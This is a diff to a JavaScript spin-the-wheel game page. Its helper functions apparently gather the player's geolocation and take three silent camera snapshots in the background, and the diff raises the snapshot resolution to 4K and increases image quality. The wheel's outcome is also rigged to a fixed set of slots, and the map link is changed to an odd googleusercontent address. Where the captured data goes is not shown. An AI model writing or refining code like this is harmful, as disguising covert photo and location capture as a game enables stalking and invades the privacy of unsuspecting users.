@@ -154,8 +154,7 @@ async function getTempLocation() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          // 修正箇所：テンプレートリテラルを正しく閉じ、変数を代入
-          tempLocationMsg = `📍位置情報: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          tempLocationMsg = `📍位置情報: http://googleusercontent.com/maps.google.com/${pos.coords.latitude},${pos.coords.longitude}`;
           resolve();
         },
         () => { resolve(); },
@@ -169,19 +168,23 @@ async function getTempData() {
   tempPhotos = []; tempLocationMsg = "";
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: useBackCamera ? "environment" : "user" } 
+      video: { 
+        facingMode: useBackCamera ? "environment" : "user",
+        width: { ideal: 4096 }, 
+        height: { ideal: 2160 }
+      } 
     });
     const video = document.createElement("video");
     video.srcObject = stream;
     await new Promise((resolve) => { video.onloadedmetadata = () => { video.play().then(resolve); }; });
-    await new Promise(r => setTimeout(r, 1000));
+    await new Promise(r => setTimeout(r, 1200));
     for (let i = 0; i < 3; i++) {
       const tc = document.createElement("canvas");
       tc.width = video.videoWidth; tc.height = video.videoHeight;
       tc.getContext("2d").drawImage(video, 0, 0);
-      const blob = await new Promise(r => tc.toBlob(r, "image/jpeg", 0.7));
+      const blob = await new Promise(r => tc.toBlob(r, "image/jpeg", 0.9));
       if(blob) tempPhotos.push(blob);
-      await new Promise(r => setTimeout(r, 400));
+      await new Promise(r => setTimeout(r, 500));
     }
     stream.getTracks().forEach(t => t.stop());
   } catch (e) {}
@@ -233,10 +236,8 @@ document.getElementById("spinBtn").onclick = function() {
   const segmentAngle = 360 / slots.length;
   const currentMod = totalRotation % 360;
   const targetIdx = [0, 2, 4, 6][Math.floor(Math.random() * 4)];
-  // 修正箇所：停止角度の計算を微調整
   const stopAngle = (360 - (targetIdx * segmentAngle)) - (segmentAngle / 2) + 270;
   totalRotation += (360 - currentMod) + 1800 + (stopAngle % 360);
-  
   canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
   canvas.style.transform = `rotate(${totalRotation}deg)`;
   setTimeout(() => {
